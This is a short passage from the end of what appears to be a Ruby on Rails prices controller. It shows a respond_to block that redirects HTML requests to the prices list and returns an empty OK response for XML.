      format.html { redirect_to(prices_url) }
      format.xml  { head :ok }
    end
  end

end
